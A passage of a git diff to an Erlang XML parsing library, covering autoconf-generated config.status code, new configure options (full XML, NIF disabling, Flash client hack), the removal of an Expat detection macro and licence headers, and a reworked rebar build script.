+  { test ! -d "$ac_tmp" || rm -fr "$ac_tmp"; } && exit $exit_status
+' 0
+  trap 'as_fn_exit 1' 1 2 13 15
+}
+# Create a (secure) tmp directory for tmp files.
+
+{
+  tmp=`(umask 077 && mktemp -d "./confXXXXXX") 2>/dev/null` &&
+  test -d "$tmp"
+}  ||
+{
+  tmp=./conf$$-$RANDOM
+  (umask 077 && mkdir "$tmp")
+} || as_fn_error $? "cannot create a temporary directory in ." "$LINENO" 5
+ac_tmp=$tmp
+
+# Set up the scripts for CONFIG_FILES section.
+# No need to generate them if there are no CONFIG_FILES.
+# This happens for instance with `./config.status config.h'.
+if test -n "$CONFIG_FILES"; then
+
+
+ac_cr=`echo X | tr X '\015'`
+# On cygwin, bash can eat \r inside `` if the user requested igncr.
+# But we know of no other shell where ac_cr would be empty at this
+# point, so we can use a bashism as a fallback.
+if test "x$ac_cr" = x; then
+  eval ac_cr=\$\'\\r\'
+fi
+ac_cs_awk_cr=`$AWK 'BEGIN { print "a\rb" }' </dev/null 2>/dev/null`
+if test "$ac_cs_awk_cr" = "a${ac_cr}b"; then
+  ac_cs_awk_cr='\\r'
+else
+  ac_cs_awk_cr=$ac_cr
+fi
+
+echo 'BEGIN {' >"$ac_tmp/subs1.awk" &&
+_ACEOF
+
+
+{
+  echo "cat >conf$$subs.awk <<_ACEOF" &&
+  echo "$ac_subst_vars" | sed 's/.*/&!$&$ac_delim/' &&
+  echo "_ACEOF"
+} >conf$$subs.sh ||
+  as_fn_error $? "could not make $CONFIG_STATUS" "$LINENO" 5
+ac_delim_num=`echo "$ac_subst_vars" | grep -c '^'`
+ac_delim='%!_!# '
+for ac_last_try in false false false false false :; do
+  . ./conf$$subs.sh ||
+    as_fn_error $? "could not make $CONFIG_STATUS" "$LINENO" 5
+
+  ac_delim_n=`sed -n "s/.*$ac_delim\$/X/p" conf$$subs.awk | grep -c X`
+  if test $ac_delim_n = $ac_delim_num; then
+    break
+  elif $ac_last_try; then
+    as_fn_error $? "could not make $CONFIG_STATUS" "$LINENO" 5
+  else
+    ac_delim="$ac_delim!$ac_delim _$ac_delim!! "
+  fi
+done
+rm -f conf$$subs.sh
+
+cat >>$CONFIG_STATUS <<_ACEOF || ac_write_fail=1
+cat >>"\$ac_tmp/subs1.awk" <<\\_ACAWK &&
+_ACEOF
+sed -n '
+h
+s/^/S["/; s/!.*/"]=/
+p
+g
+s/^[^!]*!//
+:repl
+t repl
+s/'"$ac_delim"'$//
+t delim
+:nl
+h
+s/\(.\{148\}\)..*/\1/
+t more1
+s/["\\]/\\&/g; s/^/"/; s/$/\\n"\\/
+p
+n
+b repl
+:more1
+s/["\\]/\\&/g; s/^/"/; s/$/"\\/
+p
+g
+s/.\{148\}//
+t nl
+:delim
+h
+s/\(.\{148\}\)..*/\1/
+t more2
+s/["\\]/\\&/g; s/^/"/; s/$/"/
+p
+b
+:more2
+s/["\\]/\\&/g; s/^/"/; s/$/"\\/
+p
+g
+s/.\{148\}//
+t delim
+' <conf$$subs.awk | sed '
+/^[^""]/{
+  N
+  s/\n//
+}
+' >>$CONFIG_STATUS || ac_write_fail=1
+rm -f conf$$subs.awk
+cat >>$CONFIG_STATUS <<_ACEOF || ac_write_fail=1
+_ACAWK
+cat >>"\$ac_tmp/subs1.awk" <<_ACAWK &&
+  for (key in S) S_is_set[key] = 1
+  FS = ""
+
+}
+{
+  line = $ 0
+  nfields = split(line, field, "@")
+  substed = 0
+  len = length(field[1])
+  for (i = 2; i < nfields; i++) {
+    key = field[i]
+    keylen = length(key)
+    if (S_is_set[key]) {
+      value = S[key]
+      line = substr(line, 1, len) "" value "" substr(line, len + keylen + 3)
+      len += length(value) + length(field[++i])
+      substed = 1
+    } else
+      len += 1 + keylen
+  }
+
+  print line
+}
+
+_ACAWK
+_ACEOF
+cat >>$CONFIG_STATUS <<\_ACEOF || ac_write_fail=1
+if sed "s/$ac_cr//" < /dev/null > /dev/null 2>&1; then
+  sed "s/$ac_cr\$//; s/$ac_cr/$ac_cs_awk_cr/g"
+else
+  cat
+fi < "$ac_tmp/subs1.awk" > "$ac_tmp/subs.awk" \
+  || as_fn_error $? "could not setup config files machinery" "$LINENO" 5
+_ACEOF
+
+# VPATH may cause trouble with some makes, so we remove sole $(srcdir),
+# ${srcdir} and @srcdir@ entries from VPATH if srcdir is ".", strip leading and
+# trailing colons and then remove the whole line if VPATH becomes empty
+# (actually we leave an empty line to preserve line numbers).
+if test "x$srcdir" = x.; then
+  ac_vpsub='/^[	 ]*VPATH[	 ]*=[	 ]*/{
+h
+s///
+s/^/:/
+s/[	 ]*$/:/
+s/:\$(srcdir):/:/g
+s/:\${srcdir}:/:/g
+s/:@srcdir@:/:/g
+s/^:*//
+s/:*$//
+x
+s/\(=[	 ]*\).*/\1/
+G
+s/\n//
+s/^[^=]*=[	 ]*$//
+}'
+fi
+
+cat >>$CONFIG_STATUS <<\_ACEOF || ac_write_fail=1
+fi # test -n "$CONFIG_FILES"
+
+
+eval set X "  :F $CONFIG_FILES      "
+shift
+for ac_tag
+do
+  case $ac_tag in
+  :[FHLC]) ac_mode=$ac_tag; continue;;
+  esac
+  case $ac_mode$ac_tag in
+  :[FHL]*:*);;
+  :L* | :C*:*) as_fn_error $? "invalid tag \`$ac_tag'" "$LINENO" 5;;
+  :[FH]-) ac_tag=-:-;;
+  :[FH]*) ac_tag=$ac_tag:$ac_tag.in;;
+  esac
+  ac_save_IFS=$IFS
+  IFS=:
+  set x $ac_tag
+  IFS=$ac_save_IFS
+  shift
+  ac_file=$1
+  shift
+
+  case $ac_mode in
+  :L) ac_source=$1;;
+  :[FH])
+    ac_file_inputs=
+    for ac_f
+    do
+      case $ac_f in
+      -) ac_f="$ac_tmp/stdin";;
+      *) # Look for the file first in the build tree, then in the source tree
+	 # (if the path is not absolute).  The absolute path cannot be DOS-style,
+	 # because $ac_f cannot contain `:'.
+	 test -f "$ac_f" ||
+	   case $ac_f in
+	   [\\/$]*) false;;
+	   *) test -f "$srcdir/$ac_f" && ac_f="$srcdir/$ac_f";;
+	   esac ||
+	   as_fn_error 1 "cannot find input file: \`$ac_f'" "$LINENO" 5;;
+      esac
+      case $ac_f in *\'*) ac_f=`$as_echo "$ac_f" | sed "s/'/'\\\\\\\\''/g"`;; esac
+      as_fn_append ac_file_inputs " '$ac_f'"
+    done
+
+    # Let's still pretend it is `configure' which instantiates (i.e., don't
+    # use $as_me), people would be surprised to read:
+    #    /* config.h.  Generated by config.status.  */
+    configure_input='Generated from '`
+	  $as_echo "$*" | sed 's|^[^:]*/||;s|:[^:]*/|, |g'
+	`' by configure.'
+    if test x"$ac_file" != x-; then
+      configure_input="$ac_file.  $configure_input"
+      { $as_echo "$as_me:${as_lineno-$LINENO}: creating $ac_file" >&5
+$as_echo "$as_me: creating $ac_file" >&6;}
+    fi
+    # Neutralize special characters interpreted by sed in replacement strings.
+    case $configure_input in #(
+    *\&* | *\|* | *\\* )
+       ac_sed_conf_input=`$as_echo "$configure_input" |
+       sed 's/[\\\\&|]/\\\\&/g'`;; #(
+    *) ac_sed_conf_input=$configure_input;;
+    esac
+
+    case $ac_tag in
+    *:-:* | *:-) cat >"$ac_tmp/stdin" \
+      || as_fn_error $? "could not create $ac_file" "$LINENO" 5 ;;
+    esac
+    ;;
+  esac
+
+  ac_dir=`$as_dirname -- "$ac_file" ||
+$as_expr X"$ac_file" : 'X\(.*[^/]\)//*[^/][^/]*/*$' \| \
+	 X"$ac_file" : 'X\(//\)[^/]' \| \
+	 X"$ac_file" : 'X\(//\)$' \| \
+	 X"$ac_file" : 'X\(/\)' \| . 2>/dev/null ||
+$as_echo X"$ac_file" |
+    sed '/^X\(.*[^/]\)\/\/*[^/][^/]*\/*$/{
+	    s//\1/
+	    q
+	  }
+	  /^X\(\/\/\)[^/].*/{
+	    s//\1/
+	    q
+	  }
+	  /^X\(\/\/\)$/{
+	    s//\1/
+	    q
+	  }
+	  /^X\(\/\).*/{
+	    s//\1/
+	    q
+	  }
+	  s/.*/./; q'`
+  as_dir="$ac_dir"; as_fn_mkdir_p
+  ac_builddir=.
+
+case "$ac_dir" in
+.) ac_dir_suffix= ac_top_builddir_sub=. ac_top_build_prefix= ;;
+*)
+  ac_dir_suffix=/`$as_echo "$ac_dir" | sed 's|^\.[\\/]||'`
+  # A ".." for each directory in $ac_dir_suffix.
+  ac_top_builddir_sub=`$as_echo "$ac_dir_suffix" | sed 's|/[^\\/]*|/..|g;s|/||'`
+  case $ac_top_builddir_sub in
+  "") ac_top_builddir_sub=. ac_top_build_prefix= ;;
+  *)  ac_top_build_prefix=$ac_top_builddir_sub/ ;;
+  esac ;;
+esac
+ac_abs_top_builddir=$ac_pwd
+ac_abs_builddir=$ac_pwd$ac_dir_suffix
+# for backward compatibility:
+ac_top_builddir=$ac_top_build_prefix
+
+case $srcdir in
+  .)  # We are building in place.
+    ac_srcdir=.
+    ac_top_srcdir=$ac_top_builddir_sub
+    ac_abs_top_srcdir=$ac_pwd ;;
+  [\\/]* | ?:[\\/]* )  # Absolute name.
+    ac_srcdir=$srcdir$ac_dir_suffix;
+    ac_top_srcdir=$srcdir
+    ac_abs_top_srcdir=$srcdir ;;
+  *) # Relative name.
+    ac_srcdir=$ac_top_build_prefix$srcdir$ac_dir_suffix
+    ac_top_srcdir=$ac_top_build_prefix$srcdir
+    ac_abs_top_srcdir=$ac_pwd/$srcdir ;;
+esac
+ac_abs_srcdir=$ac_abs_top_srcdir$ac_dir_suffix
+
+
+  case $ac_mode in
+  :F)
+  #
+  # CONFIG_FILE
+  #
+
+_ACEOF
+
+cat >>$CONFIG_STATUS <<\_ACEOF || ac_write_fail=1
+# If the template does not know about datarootdir, expand it.
+# FIXME: This hack should be removed a few years after 2.60.
+ac_datarootdir_hack=; ac_datarootdir_seen=
+ac_sed_dataroot='
+/datarootdir/ {
+  p
+  q
+}
+/@datadir@/p
+/@docdir@/p
+/@infodir@/p
+/@localedir@/p
+/@mandir@/p'
+case `eval "sed -n \"\$ac_sed_dataroot\" $ac_file_inputs"` in
+*datarootdir*) ac_datarootdir_seen=yes;;
+*@datadir@*|*@docdir@*|*@infodir@*|*@localedir@*|*@mandir@*)
+  { $as_echo "$as_me:${as_lineno-$LINENO}: WARNING: $ac_file_inputs seems to ignore the --datarootdir setting" >&5
+$as_echo "$as_me: WARNING: $ac_file_inputs seems to ignore the --datarootdir setting" >&2;}
+_ACEOF
+cat >>$CONFIG_STATUS <<_ACEOF || ac_write_fail=1
+  ac_datarootdir_hack='
+  s&@datadir@&$datadir&g
+  s&@docdir@&$docdir&g
+  s&@infodir@&$infodir&g
+  s&@localedir@&$localedir&g
+  s&@mandir@&$mandir&g
+  s&\\\${datarootdir}&$datarootdir&g' ;;
+esac
+_ACEOF
+
+# Neutralize VPATH when `$srcdir' = `.'.
+# Shell code in configure.ac might set extrasub.
+# FIXME: do we really want to maintain this feature?
+cat >>$CONFIG_STATUS <<_ACEOF || ac_write_fail=1
+ac_sed_extra="$ac_vpsub
+$extrasub
+_ACEOF
+cat >>$CONFIG_STATUS <<\_ACEOF || ac_write_fail=1
+:t
+/@[a-zA-Z_][a-zA-Z_0-9]*@/!b
+s|@configure_input@|$ac_sed_conf_input|;t t
+s&@top_builddir@&$ac_top_builddir_sub&;t t
+s&@top_build_prefix@&$ac_top_build_prefix&;t t
+s&@srcdir@&$ac_srcdir&;t t
+s&@abs_srcdir@&$ac_abs_srcdir&;t t
+s&@top_srcdir@&$ac_top_srcdir&;t t
+s&@abs_top_srcdir@&$ac_abs_top_srcdir&;t t
+s&@builddir@&$ac_builddir&;t t
+s&@abs_builddir@&$ac_abs_builddir&;t t
+s&@abs_top_builddir@&$ac_abs_top_builddir&;t t
+$ac_datarootdir_hack
+"
+eval sed \"\$ac_sed_extra\" "$ac_file_inputs" | $AWK -f "$ac_tmp/subs.awk" \
+  >$ac_tmp/out || as_fn_error $? "could not create $ac_file" "$LINENO" 5
+
+test -z "$ac_datarootdir_hack$ac_datarootdir_seen" &&
+  { ac_out=`sed -n '/\${datarootdir}/p' "$ac_tmp/out"`; test -n "$ac_out"; } &&
+  { ac_out=`sed -n '/^[	 ]*datarootdir[	 ]*:*=/p' \
+      "$ac_tmp/out"`; test -z "$ac_out"; } &&
+  { $as_echo "$as_me:${as_lineno-$LINENO}: WARNING: $ac_file contains a reference to the variable \`datarootdir'
+which seems to be undefined.  Please make sure it is defined" >&5
+$as_echo "$as_me: WARNING: $ac_file contains a reference to the variable \`datarootdir'
+which seems to be undefined.  Please make sure it is defined" >&2;}
+
+  rm -f "$ac_tmp/stdin"
+  case $ac_file in
+  -) cat "$ac_tmp/out" && rm -f "$ac_tmp/out";;
+  *) rm -f "$ac_file" && mv "$ac_tmp/out" "$ac_file";;
+  esac \
+  || as_fn_error $? "could not create $ac_file" "$LINENO" 5
+ ;;
+
+
+
+  esac
+
+done # for ac_tag
+
+
 as_fn_exit 0
 _ACEOF
 ac_clean_files=$ac_clean_files_save
diff --git a/configure.ac b/configure.ac
index 8f7e447..46eca07 100644
--- a/configure.ac
+++ b/configure.ac
@@ -39,4 +39,33 @@ if test "x$EXPAT_HEADER" = "x"; then
    AC_MSG_ERROR([Expat header file "expat.h" was not found])
 fi
 
+AC_ARG_ENABLE(full_xml,
+[AC_HELP_STRING([--enable-full-xml], [use XML features in XMPP stream (ex: CDATA) (default: no, requires XML compliant clients)])],
+[case "${enableval}" in
+  yes) full_xml=true ;;
+  no)  full_xml=false ;;
+  *) AC_MSG_ERROR(bad value ${enableval} for --enable-full-xml) ;;
+esac],[full_xml=false])
+AC_SUBST(full_xml)
+
+AC_ARG_ENABLE(disable_nif,
+[AC_HELP_STRING([--disable-nif], [ (default: no)])],
+[case "${enableval}" in
+  yes) disable_nif=true ;;
+  no)  disable_nif=false ;;
+  *) AC_MSG_ERROR(bad value ${enableval} for --disable-nif) ;;
+esac],[disable_nif=false])
+AC_SUBST(disable_nif)
+
+AC_ARG_ENABLE(flash_hack,
+[AC_HELP_STRING([--enable-flash-hack], [support Adobe Flash client XML (default: no)])],
+[case "${enableval}" in
+  yes) flash_hack=true ;;
+  no)  flash_hack=false ;;
+  *) AC_MSG_ERROR(bad value ${enableval} for --enable-flash-hack) ;;
+esac],[flash_hack=false])
+AC_SUBST(flash_hack)
+
+AC_CONFIG_FILES([rebar.config.script])
+
 AC_OUTPUT
diff --git a/include/xml.hrl b/include/xml.hrl
index 750b820..97ca575 100644
--- a/include/xml.hrl
+++ b/include/xml.hrl
@@ -1,26 +1,11 @@
-%%%----------------------------------------------------------------------
-%%% File    : xml.hrl
-%%% Author  : Evgeniy Khramtsov <ekhramtsov@process-one.net>
-%%% Purpose : XML utils
-%%% Created : 1 May 2013 by Evgeniy Khramtsov <ekhramtsov@process-one.net>
+%%%-------------------------------------------------------------------
+%%% @author Evgeniy Khramtsov <ekhramtsov@process-one.net>
+%%% @copyright (C) 2013, Evgeniy Khramtsov
+%%% @doc
 %%%
-%%%
-%%% Copyright (C) 2002-2015 ProcessOne, SARL. All Rights Reserved.
-%%%
-%%% Licensed under the Apache License, Version 2.0 (the "License");
-%%% you may not use this file except in compliance with the License.
-%%% You may obtain a copy of the License at
-%%%
-%%%     http://www.apache.org/licenses/LICENSE-2.0
-%%%
-%%% Unless required by applicable law or agreed to in writing, software
-%%% distributed under the License is distributed on an "AS IS" BASIS,
-%%% WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-%%% See the License for the specific language governing permissions and
-%%% limitations under the License.
-%%%
-%%%----------------------------------------------------------------------
-
+%%% @end
+%%% Created :  1 May 2013 by Evgeniy Khramtsov <ekhramtsov@process-one.net>
+%%%-------------------------------------------------------------------
 -record(xmlel,
 {
     name = <<"">> :: binary(),
diff --git a/include/xml_gen.hrl b/include/xml_gen.hrl
index 7fbebc5..f7b34de 100644
--- a/include/xml_gen.hrl
+++ b/include/xml_gen.hrl
@@ -1,26 +1,3 @@
-%%%----------------------------------------------------------------------
-%%% File    : xml_gen.hrl
-%%% Author  : Evgeniy Khramtsov <ekhramtsov@process-one.net>
-%%% Purpose : XML utils
-%%% Created : 1 May 2013 by Evgeniy Khramtsov <ekhramtsov@process-one.net>
-%%%
-%%%
-%%% Copyright (C) 2002-2015 ProcessOne, SARL. All Rights Reserved.
-%%%
-%%% Licensed under the Apache License, Version 2.0 (the "License");
-%%% you may not use this file except in compliance with the License.
-%%% You may obtain a copy of the License at
-%%%
-%%%     http://www.apache.org/licenses/LICENSE-2.0
-%%%
-%%% Unless required by applicable law or agreed to in writing, software
-%%% distributed under the License is distributed on an "AS IS" BASIS,
-%%% WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-%%% See the License for the specific language governing permissions and
-%%% limitations under the License.
-%%%
-%%%----------------------------------------------------------------------
-
 -record(attr, {name,
 	       label,
 	       required = false,
diff --git a/m4/ax_lib_expat.m4 b/m4/ax_lib_expat.m4
deleted file mode 100644
index 20b95a9..0000000
--- a/m4/ax_lib_expat.m4
+++ /dev/null
@@ -1,283 +0,0 @@
-# ===========================================================================
-#       http://www.gnu.org/software/autoconf-archive/ax_lib_expat.html
-# ===========================================================================
-#
-# SYNOPSIS
-#
-#   AX_LIB_EXPAT([MINIMUM-VERSION])
-#
-# DESCRIPTION
-#
-#   This macro provides tests of availability of Expat XML Parser of
-#   particular version or newer. This macro checks for Expat XML Parser
-#   headers and libraries and defines compilation flags
-#
-#   Macro supports following options and their values:
-#
-#   1) Single-option usage:
-#
-#     --with-expat      -- yes, no, or path to Expat XML Parser
-#                          installation prefix
-#
-#   2) Three-options usage (all options are required):
-#
-#     --with-expat=yes
-#     --with-expat-inc  -- path to base directory with Expat headers
-#     --with-expat-lib  -- linker flags for Expat
-#
-#   This macro calls:
-#
-#     AC_SUBST(EXPAT_CFLAGS)
-#     AC_SUBST(EXPAT_LIBS)
-#     AC_SUBST(EXPAT_LDFLAGS)
-#     AC_SUBST(EXPAT_VERSION)  -- only if version requirement is used
-#
-#   And sets:
-#
-#     HAVE_EXPAT
-#
-# LICENSE
-#
-#   Copyright (c) 2008 Mateusz Loskot <mateusz@loskot.net>
-#
-#   Copying and distribution of this file, with or without modification, are
-#   permitted in any medium without royalty provided the copyright notice
-#   and this notice are preserved. This file is offered as-is, without any
-#   warranty.
-
-#serial 10
-
-AC_DEFUN([AX_LIB_EXPAT],
-[
-    AC_ARG_WITH([expat],
-        AS_HELP_STRING([--with-expat=@<:@ARG@:>@],
-            [use Expat XML Parser from given prefix (ARG=path); check standard prefixes (ARG=yes); disable (ARG=no)]
-        ),
-        [
-        if test "$withval" = "yes"; then
-            if test -f /usr/local/include/expat.h ; then
-                expat_prefix=/usr/local
-            elif test -f /usr/include/expat.h ; then
-                expat_prefix=/usr
-            else
-                expat_prefix=""
-            fi
-            expat_requested="yes"
-        elif test -d "$withval"; then
-            expat_prefix="$withval"
-            expat_requested="yes"
-        else
-            expat_prefix=""
-            expat_requested="no"
-        fi
-        ],
-        [
-        dnl Default behavior is implicit yes
-        if test -f /usr/local/include/expat.h ; then
-            expat_prefix=/usr/local
-        elif test -f /usr/include/expat.h ; then
-            expat_prefix=/usr
-        else
-            expat_prefix=""
-        fi
-        ]
-    )
-
-    AC_ARG_WITH([expat-inc],
-        AS_HELP_STRING([--with-expat-inc=@<:@DIR@:>@],
-            [path to Expat XML Parser headers]
-        ),
-        [expat_include_dir="$withval"],
-        [expat_include_dir=""]
-    )
-    AC_ARG_WITH([expat-lib],
-        AS_HELP_STRING([--with-expat-lib=@<:@ARG@:>@],
-            [link options for Expat XML Parser libraries]
-        ),
-        [expat_lib_flags="$withval"],
-        [expat_lib_flags=""]
-    )
-
-    EXPAT_CFLAGS=""
-    EXPAT_LIBS=""
-    EXPAT_VERSION=""
-
-    dnl
-    dnl Collect include/lib paths and flags
-    dnl
-    run_expat_test="no"
-
-    if test -n "$expat_prefix"; then
-        expat_include_dir="$expat_prefix/include"
-        expat_ld_flags="-L$expat_prefix/lib"
-        expat_lib_flags="-lexpat"
-        run_expat_test="yes"
-    elif test "$expat_requested" = "yes"; then
-        if test -n "$expat_include_dir" -a -n "$expat_lib_flags"; then
-            run_expat_test="yes"
-        fi
-    else
-        run_expat_test="no"
-    fi
-
-    dnl
-    dnl Check Expat XML Parser files
-    dnl
-    if test "$run_expat_test" = "yes"; then
-
-        saved_CPPFLAGS="$CPPFLAGS"
-        CPPFLAGS="$CPPFLAGS -I$expat_include_dir"
-
-        saved_LIBS="$LIBS"
-        LIBS="$LIBS $expat_lib_flags"
-
-        saved_LDFLAGS="$LDFLAGS"
-        LDFLAGS="$LDFLAGS $expat_ld_flags"
-
-        dnl
-        dnl Check Expat headers
-        dnl
-        AC_MSG_CHECKING([for Expat XML Parser headers in $expat_include_dir])
-
-        AC_LANG_PUSH([C++])
-        AC_COMPILE_IFELSE([
-            AC_LANG_PROGRAM(
-                [[
-@%:@include <expat.h>
-                ]],
-                [[]]
-            )],
-            [
-            EXPAT_CFLAGS="-I$expat_include_dir"
-            expat_header_found="yes"
-            AC_MSG_RESULT([found])
-            ],
-            [
-            expat_header_found="no"
-            AC_MSG_RESULT([not found])
-            ]
-        )
-        AC_LANG_POP([C++])
-
-        dnl
-        dnl Check Expat libraries
-        dnl
-        if test "$expat_header_found" = "yes"; then
-
-            AC_MSG_CHECKING([for Expat XML Parser libraries])
-
-            AC_LANG_PUSH([C++])
-            AC_LINK_IFELSE([
-                AC_LANG_PROGRAM(
-                    [[
-@%:@include <expat.h>
-                    ]],
-                    [[
-XML_Parser p = XML_ParserCreate(NULL);
-XML_ParserFree(p);
-p = NULL;
-                    ]]
-                )],
-                [
-                EXPAT_LIBS="$expat_lib_flags"
-                EXPAT_LDFLAGS="$expat_ld_flags"
-                expat_lib_found="yes"
-                AC_MSG_RESULT([found])
-                ],
-                [
-                expat_lib_found="no"
-                AC_MSG_RESULT([not found])
-                ]
-            )
-            AC_LANG_POP([C++])
-        fi
-
-        CPPFLAGS="$saved_CPPFLAGS"
-        LDFLAGS="$saved_LDFLAGS"
-        LIBS="$saved_LIBS"
-    fi
-
-    AC_MSG_CHECKING([for Expat XML Parser])
-
-    if test "$run_expat_test" = "yes"; then
-        if test "$expat_header_found" = "yes" -a "$expat_lib_found" = "yes"; then
-
-            AC_SUBST([EXPAT_CFLAGS])
-            AC_SUBST([EXPAT_LDFLAGS])
-            AC_SUBST([EXPAT_LIBS])
-
-            HAVE_EXPAT="yes"
-        else
-            HAVE_EXPAT="no"
-        fi
-
-        AC_MSG_RESULT([$HAVE_EXPAT])
-
-        dnl
-        dnl Check Expat version
-        dnl
-        if test "$HAVE_EXPAT" = "yes"; then
-
-            expat_version_req=ifelse([$1], [], [], [$1])
-
-            if test  -n "$expat_version_req"; then
-
-                AC_MSG_CHECKING([if Expat XML Parser version is >= $expat_version_req])
-
-                if test -f "$expat_include_dir/expat.h"; then
-
-                    expat_major=`cat $expat_include_dir/expat.h | \
-                                    grep '^#define.*XML_MAJOR_VERSION.*[0-9]$' | \
-                                    sed -e 's/#define XML_MAJOR_VERSION.//'`
-
-                    expat_minor=`cat $expat_include_dir/expat.h | \
-                                    grep '^#define.*XML_MINOR_VERSION.*[0-9]$' | \
-                                    sed -e 's/#define XML_MINOR_VERSION.//'`
-
-                    expat_revision=`cat $expat_include_dir/expat.h | \
-                                    grep '^#define.*XML_MICRO_VERSION.*[0-9]$' | \
-                                    sed -e 's/#define XML_MICRO_VERSION.//'`
-
-                    EXPAT_VERSION="$expat_major.$expat_minor.$expat_revision"
-                    AC_SUBST([EXPAT_VERSION])
-
-                    dnl Decompose required version string and calculate numerical representation
-                    expat_version_req_major=`expr $expat_version_req : '\([[0-9]]*\)'`
-                    expat_version_req_minor=`expr $expat_version_req : '[[0-9]]*\.\([[0-9]]*\)'`
-                    expat_version_req_revision=`expr $expat_version_req : '[[0-9]]*\.[[0-9]]*\.\([[0-9]]*\)'`
-                    if test "x$expat_version_req_revision" = "x"; then
-                        expat_version_req_revision="0"
-                    fi
-
-                    expat_version_req_number=`expr $expat_version_req_major \* 10000 \
-                                               \+ $expat_version_req_minor \* 100 \
-                                               \+ $expat_version_req_revision`
-
-                    dnl Calculate numerical representation of detected version
-                    expat_version_number=`expr $expat_major \* 10000 \
-                                          \+ $expat_minor \* 100 \
-                                           \+ $expat_revision`
-
-                    expat_version_check=`expr $expat_version_number \>\= $expat_version_req_number`
-                    if test "$expat_version_check" = "1"; then
-                        AC_MSG_RESULT([yes])
-                    else
-                        AC_MSG_RESULT([no])
-                        AC_MSG_WARN([Found Expat XML Parser $EXPAT_VERSION, which is older than required. Possible compilation failure.])
-                    fi
-                else
-                    AC_MSG_RESULT([no])
-                    AC_MSG_WARN([Missing expat.h header. Unable to determine Expat version.])
-                fi
-            fi
-        fi
-
-    else
-        HAVE_EXPAT="no"
-        AC_MSG_RESULT([$HAVE_EXPAT])
-
-        if test "$expat_requested" = "yes"; then
-            AC_MSG_WARN([Expat XML Parser support requested but headers or library not found. Specify valid prefix of Expat using --with-expat=@<:@DIR@:>@ or provide include directory and linker flags using --with-expat-inc and --with-expat-lib])
-        fi
-    fi
-])
diff --git a/rebar.config.script b/rebar.config.script
index 0b91bf1..8f0211d 100644
--- a/rebar.config.script
+++ b/rebar.config.script
@@ -2,41 +2,46 @@
 %%% @author Evgeniy Khramtsov <ekhramtsov@process-one.net>
 %%% @copyright (C) 2013, Evgeniy Khramtsov
 %%% @doc
-%%% Rebar build script. Compliant with rebar and rebar3.
+%%%
 %%% @end
 %%% Created :  8 May 2013 by Evgeniy Khramtsov <ekhramtsov@process-one.net>
 %%%-------------------------------------------------------------------
+Cfg = [{full_xml, false},
+       {flash_hack, false},
+       {disable_nif, false}].
 
-NIFPortSpec = [{"priv/lib/xml.so", ["c_src/xml.c"]},
-               {"priv/lib/xml_stream.so", ["c_src/xml_stream.c"]}],
+Macros = lists:flatmap(
+           fun({full_xml, true}) ->
+                   [{d, 'FULL_XML_SUPPORT'}];
+              ({disable_nif, true}) ->
+                   [{d, 'DISABLE_NIF'}];
+              ({flash_hack, true}) ->
+                   [{d, 'ENABLE_FLASH_HACK'}];
+              (_) ->
+                   []
+           end, Cfg),
 
-Config = [{erl_opts, [debug_info, {src_dirs, ["src"]}]},
-          {port_env, [{"CFLAGS", "$CFLAGS -g -O2 -Wall"},
-                      {"LDFLAGS", "$LDFLAGS -lexpat"}]},
-          {port_specs, NIFPortSpec},
-
-          {cover_enabled, true},
-          {cover_export_enabled, true},
+NIFPortSpec = case lists:keysearch(disable_nif, 1, Cfg) of
+                  {value, {disable_nif, true}} ->
+                      [];
+                  _ ->
+                      [{"priv/lib/xml.so", ["c_src/xml.c"]}]
+              end,
 
-          {profiles, [{test, [{erl_opts, [{src_dirs, ["src", "test"]}]}]}]},
-          {plugins, [rebar3_hex]}],
+FlashHackFlag = case lists:keysearch(flash_hack, 1, Cfg) of
+                    {value, {flash_hack, true}} ->
+                        " -DENABLE_FLASH_HACK";
+                    _ ->
+                        ""
+                end,
 
-%% When running Travis test, upload test coverage result to coveralls:
-Config2 = case os:getenv("TRAVIS") of
-              "true" ->
-                  JobId = os:getenv("TRAVIS_JOB_ID"),
-                  C1 = lists:keystore(deps, 1, Config, {deps, [{coveralls, ".*", {git, "https://github.com/markusn/coveralls-erl.git", "master"}}]}),
-                  C2 = lists:keystore(plugin_dir, 1, C1, {plugin_dir, "deps/coveralls/src"}),
-                  C3 = lists:keystore(plugins, 1, C2, {plugins, [rebar_coveralls]}), %% We do not need rebar3_hex from Travis
-                  C4 = lists:keystore(coveralls_coverdata, 1, C3, {coveralls_coverdata, ".eunit/cover.coverdata"}),
-                  C5 = lists:keystore(coveralls_service_job_id, 1, C4, {coveralls_service_job_id, JobId}),
-                  lists:keystore(coveralls_service_name, 1, C5, {coveralls_service_name, "travis-ci"});
-              _ ->
-                  Config 
-          end,
-
-%%io:format("xml configuration:~n  ~p~n", [Config2]),
-Config2.
+Config = [{erl_opts, [debug_info, {src_dirs, [src, specs]}|Macros]},
+          {port_env, [{"CFLAGS", "$CFLAGS -g -O2 -Wall" ++ FlashHackFlag},
+                      {"LDFLAGS", "$LDFLAGS -lexpat"}]},
+          {port_specs, [{"priv/lib/expat_erl.so", ["c_src/expat_erl.c"]}
+                        | NIFPortSpec]}],
+%%io:format("xml configuration:~n  ~p~n", [Config]),
+Config.
 
 %% Local Variables:
 %% mode: erlang
diff --git a/rebar.config.script.in b/rebar.config.script.in
new file mode 100644
index 0000000..5b640a2
--- /dev/null
+++ b/rebar.config.script.in
@@ -0,0 +1,49 @@
+%%%-------------------------------------------------------------------
+%%% @author Evgeniy Khramtsov <ekhramtsov@process-one.net>
+%%% @copyright (C) 2013, Evgeniy Khramtsov
+%%% @doc
+%%%
+%%% @end
+%%% Created :  8 May 2013 by Evgeniy Khramtsov <ekhramtsov@process-one.net>
+%%%-------------------------------------------------------------------
+Cfg = [{full_xml, @full_xml@},
+       {flash_hack, @flash_hack@},
+       {disable_nif, @disable_nif@}].
+
+Macros = lists:flatmap(
+           fun({full_xml, true}) ->
+                   [{d, 'FULL_XML_SUPPORT'}];
+              ({disable_nif, true}) ->
+                   [{d, 'DISABLE_NIF'}];
+              ({flash_hack, true}) ->
+                   [{d, 'ENABLE_FLASH_HACK'}];
+              (_) ->
+                   []
+           end, Cfg),
+
+NIFPortSpec = case lists:keysearch(disable_nif, 1, Cfg) of
+                  {value, {disable_nif, true}} ->
+                      [];
+                  _ ->
+                      [{"priv/lib/xml.so", ["c_src/xml.c"]}]
+              end,
+
+FlashHackFlag = case lists:keysearch(flash_hack, 1, Cfg) of
+                    {value, {flash_hack, true}} ->
+                        " -DENABLE_FLASH_HACK";
+                    _ ->
+                        ""
+                end,
+
